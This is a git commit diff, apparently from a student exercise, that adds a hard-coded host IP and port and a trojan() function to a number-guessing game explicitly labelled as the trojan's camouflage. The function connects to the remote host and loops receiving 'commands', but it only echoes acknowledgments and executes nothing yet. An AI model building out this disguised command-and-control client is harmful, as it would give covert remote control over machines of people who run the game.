d5a5de92566f48ee7d3259caa5d722ca8f9bfcce
Antoinechss <antoine.chosson@eleves.enpc.fr>
2026-01-03 08:56:56 +0100

    first basic connection with trojan function

---
+++ configs.py
@@ -0,0 +1,2 @@
+HOST = "172.20.10.6" # Host IP Adress
+PORT = 9090
--- horse.py
+++ horse.py
@@ -1,12 +1,15 @@
 """
 Covering Of Trojan Horse
 """
-
+from configs import HOST, PORT
 import random
-
+import socket
+import threading
 
 def game():
-
+    """
+    UI Camouflage Of TH
+    """
     number = random.randint(0, 1000)
     tries = 1
     done = False
@@ -20,3 +23,15 @@ def game():
             tries += 1 
             print("Try again")
     print(f"You guessed in {tries} tries")
+
+
+def trojan():
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((HOST, PORT))
+    while True:
+        server_command = client.recv(1024).decode("utf-8")
+        if server_command == "hello":
+            print("Hello World")
+        client.send(f"{server_command} was executed successfully!".encode("utf-8"))
+
